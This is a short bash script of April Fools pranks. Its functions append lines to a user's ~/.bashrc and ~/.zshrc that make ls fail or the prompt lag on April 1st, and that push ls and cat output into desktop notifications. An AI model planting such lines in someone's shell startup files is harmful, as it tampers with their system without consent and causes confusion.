#!/bin/bash

function evil_ls() {
  local cmd='function ls(){ [ $(date +%m%d) -eq "0401" ] && echo "ls: command not found" || command ls "$@"; }'

  echo "$cmd" >>"$HOME"/.bashrc
  echo "$cmd" >>"$HOME"/.zshrc
}

function evil_prompt() {
  local cmd='export PROMPT_COMMAND="[ \$(date +%m%d) -eq "0401" ] && sleep 0.\$((\$RANDOM%7 + 1))"'

  echo "$cmd" >>"$HOME"/.bashrc
}

function funny_ls() {
  local cmd='function ls() { notify-send $PWD "$(command ls $@)"; }'

  echo "$cmd" >>"$HOME"/.bashrc
  echo "$cmd" >>"$HOME"/.zshrc
}

function funny_cat() {
  local cmd='function cat() { notify-send "$(command cat $@)"; }'

  echo "$cmd" >>"$HOME"/.bashrc
  echo "$cmd" >>"$HOME"/.zshrc
}
